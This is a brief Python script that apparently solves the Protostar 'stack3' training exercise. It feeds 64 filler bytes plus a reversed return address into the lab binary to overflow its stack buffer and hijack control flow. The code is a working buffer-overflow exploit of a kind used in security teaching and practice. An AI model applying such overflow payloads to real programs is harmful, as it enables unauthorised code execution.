#!/usr/bin/env python2.6

import subprocess

p = subprocess.Popen("/opt/protostar/bin/stack3",stdin=subprocess.PIPE)

flag = reversed('\x08\x04\x84\x24')

payload = "A" * 64 + "".join(flag)

p.communicate(payload)
